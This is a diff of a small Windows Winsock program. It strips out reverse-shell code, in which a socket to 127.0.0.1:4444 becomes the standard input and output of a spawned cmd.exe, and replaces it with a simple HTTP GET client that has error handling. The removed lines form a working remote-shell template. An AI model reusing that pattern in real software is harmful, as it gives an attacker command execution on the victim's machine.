@@ -1,7 +1,10 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
-#include <stdio.h>
+#include <iostream>
+#include <string>
 #pragma comment(lib, "ws2_32.lib")
+
+using namespace std;
 
 WSADATA wsaData;
 SOCKET wSock;
@@ -12,7 +15,7 @@ PROCESS_INFORMATION pi;
 int main(int argc, char* argv[])
 {
     const char* ip = "127.0.0.1";
-    short port = 4444;
+    short port = 8080;
 
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 
@@ -22,14 +25,32 @@ int main(int argc, char* argv[])
     hax.sin_port = htons(port);
     hax.sin_addr.s_addr = inet_addr(ip);
 
-    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        cout << "Error: Unable to connect to server." << endl;
+        WSACleanup();
+        return 1;
+    }
 
-    memset(&sui, 0, sizeof(sui));
-    sui.cb = sizeof(sui);
-    sui.dwFlags = STARTF_USESTDHANDLES;
-    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;
+    const char* request = "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n";
+    if (send(wSock, request, strlen(request), 0) == SOCKET_ERROR) {
+        cout << "Error: Unable to send request." << endl;
+        closesocket(wSock);
+        WSACleanup();
+        return 1;
+    }
 
-    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+    char buffer[1024];
+    int bytesReceived = recv(wSock, buffer, sizeof(buffer) - 1, 0);
+    if (bytesReceived > 0) {
+        buffer[bytesReceived] = '\0';
+        cout << "Response: " << buffer << endl;
+    }
+    else {
+        cout << "Error: No response received or connection closed." << endl;
+    }
 
-    exit(0);
+    closesocket(wSock);
+    WSACleanup();
+
+    return 0;
 }
